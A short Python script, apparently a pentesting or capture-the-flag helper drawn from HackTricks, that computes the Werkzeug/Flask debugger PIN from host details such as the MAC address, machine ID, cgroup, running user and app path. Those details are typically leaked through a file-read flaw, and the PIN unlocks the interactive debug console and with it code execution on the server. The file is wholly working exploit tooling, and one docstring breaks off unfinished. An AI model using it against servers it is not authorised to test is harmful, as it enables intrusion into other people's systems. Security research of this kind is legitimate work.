import hashlib
from itertools import chain
from typing import Callable

"""
Source: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#pin-protected-path-traversal
"""

def parse_arp_file(file_contents: str) -> str:
    lines = file_contents.split('\n')[1:]
    headers = ['ip_address', 'hw_type', 'flags', 'hw_address', 'mask', 'device']
    entries = []
    for line in lines:
        if line != "":
            columns = line.split()
            entry = dict(zip(headers, columns))
            entries.append(entry)
    return entries

def parse_mac_address(file_contents: str) -> str: 
    address = file_contents.rstrip()
    bytes = address.replace(':', '')
    return str(int(bytes, 16))


def create_random_id(machine_id: str, boot_id: str, cgroup: str) -> str:
    output = ""
    if machine_id:
        output += machine_id
    else:
        output += boot_id
    output += cgroup
    return output

def resolve_pin(
        running_user: str,
        path_to_flask: str,
        mac_address: int,
        random_id: str,
        module_name: str = "flask.app",
        app_name: str = "Flask",
        hashing_func: Callable = hashlib.sha1
    ) -> str:
    """
    Args:
        running_user (str): The user who started Flask
        path_to_flask (str): The absolute path of app.py in Flask directory
        mac_address (int): The mac_address of the current computer converted to decimal.
        random_id (str): Either 
        
    """
    probably_public_bits = [
        running_user,
        module_name,
        app_name,
        path_to_flask
    ]

    private_bits = [
        mac_address,
        random_id
    ]

    h = hashing_func()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')
    #h.update(b'shittysalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv